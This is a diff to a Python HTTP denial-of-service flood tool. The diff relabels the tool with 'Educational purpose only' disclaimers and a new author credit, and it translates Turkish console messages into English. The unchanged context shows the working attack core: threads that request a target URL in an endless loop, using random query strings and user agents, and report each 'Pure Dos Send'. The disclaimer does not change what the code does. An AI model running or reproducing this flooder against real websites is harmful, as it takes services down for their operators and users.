@@ -6,11 +6,18 @@ import random
 from banner import access
 
 ########################################
-# discord.gg/starsteam                 #
+# Educational purpose only             #
 ########################################
-# 𝐀𝐃𝐀 𝐆𝐔𝐑𝐒𝐎𝐘#1000                    #
+# I'm not responsible for your actions #
 ########################################
 
+"""
+Created By: RootUnited
+--------------------------------------------------
+This Tool is for Educational purpose only             
+I'm not responsible for your actions 
+FOLLOW : https://instagram.com/rootunited
+"""
 
 
 if sys.platform == "linux" or sys.platform == "linux2":
@@ -57,7 +64,7 @@ class httpth1(threading.Thread):
         global count
         while True:
             try:
-                #print ("\033[1;32m Saldırılan Web Sitesi \033[1;m")
+                #print ("\033[1;32m Attacking Website \033[1;m")
                 req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                 #req = urllib2.Request(url)
                 req.add_header("User-Agent", random.choice(useragent()))
@@ -67,16 +74,16 @@ class httpth1(threading.Thread):
                 count += 1
                 print ("{0} Pure Dos Send".format(count))
             except urllib2.HTTPError:
-                print ("\033[1;34m SUNUCU GG \033[1;m")
+                print ("\033[1;34m SERVER MIGHT ME DOWN \033[1;m")
                 pass
             except urllib2.URLError:
-                print ("\033[1;34m URL HATASI \033[1;m")
+                print ("\033[1;34m URLERROR \033[1;m")
                 sys.exit()
             except ValueError:
-                print ("\033[1;34m [-]URL'nizi kontrol edin \033[1;m")
+                print ("\033[1;34m [-]Check You're URL \033[1;m")
                 sys.exit()
             except KeyboardInterrupt:
-                exit("\033[1;34m [-]Kullanici tarafindan iptal edildi \033[1;m")
+                exit("\033[1;34m [-]Canceled By User \033[1;m")
                 sys.exit()
 
 
@@ -87,4 +94,4 @@ while True:
     except Exception:
         pass
     except KeyboardInterrupt:
-        exit("\033[1;34m [-]Kullanici tarafindan iptal edildi \033[1;m")
+        exit("\033[1;34m [-]Canceled By User \033[1;m")
